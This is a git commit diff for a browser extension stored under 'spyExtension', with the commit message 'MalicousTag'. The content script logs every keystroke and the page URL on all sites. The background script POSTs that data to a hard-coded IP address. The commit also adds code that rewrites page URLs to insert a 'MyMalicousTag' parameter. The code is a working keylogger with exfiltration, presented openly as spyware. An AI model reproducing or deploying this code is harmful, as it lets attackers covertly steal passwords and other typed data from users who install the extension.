7fe5afac1f55aecd5db2011d02d18c2a2d18f8da
SkYiiR <63869335+SkYiiR@users.noreply.github.com>
2023-05-24 18:04:29 +0200

    MalicousTag

--- spyExtension/background.js
+++ spyExtension/background.js
@@ -1,22 +1,20 @@
 chrome.runtime.onMessage.addListener((data, sender, sendResponse) => {
-  
-    // Use URLSearchParams to encode the data as form data
-    var formData = new URLSearchParams();
-    formData.append('key', data.key);
-    formData.append('page', data.page);
-    fetch('http://192.168.209.149/', {
-      method: 'POST',
-      body: formData,
-    })
-    .then(response => response.text())
-    .then(text => {
-      sendResponse({message: text});
+  // Use URLSearchParams to encode the data as form data
+  var formData = new URLSearchParams();
+  formData.append("key", data.key);
+  formData.append("page", data.page);
+  fetch("http://192.168.1.220/", {
+    method: "POST",
+    body: formData,
+  })
+    .then((response) => response.text())
+    .then((text) => {
+      sendResponse({ message: text });
     })
     .catch((error) => {
-      console.error('Error:', error);
-      sendResponse({error: error.message});
+      console.error("Error:", error);
+      sendResponse({ error: error.message });
     });
-  
-    return true;  // to keep the message channel open until sendResponse is called
-  });
-  
+
+  return true; // to keep the message channel open until sendResponse is called
+});
--- spyExtension/content.js
+++ spyExtension/content.js
@@ -1,16 +1,31 @@
-chrome.runtime.onConnect.addListener(function(port){});
+chrome.runtime.onConnect.addListener(function (port) {});
 
 var k = "";
 var data = {};
-window.onkeydown = function(event){
-    if(event.key.length > 1){
-        k = " (" + event.key + ") ";
-    }else{
-        k = event.key;
-    }
-    data = {
-        key: k,
-        page: window.location.href
-    };
-    chrome.runtime.sendMessage(data);
+window.onkeydown = function (event) {
+  if (event.key.length > 1) {
+    k = " (" + event.key + ") ";
+  } else {
+    k = event.key;
+  }
+  data = {
+    key: k,
+    page: window.location.href,
+  };
+  chrome.runtime.sendMessage(data);
+};
+
+function modifyURL() {
+  const url = new URL(window.location.href);
+  url.searchParams.set("tag", "MyMalicousTag");
+  const modifiedUrl = url.toString();
+
+  if (window.location.href !== modifiedUrl) {
+    window.location.href = modifiedUrl;
+  }
+}
+
+// Only modify the URL if it doesn't already have the "tag" parameter
+if (!window.location.search.includes("tag=")) {
+  modifyURL();
 }
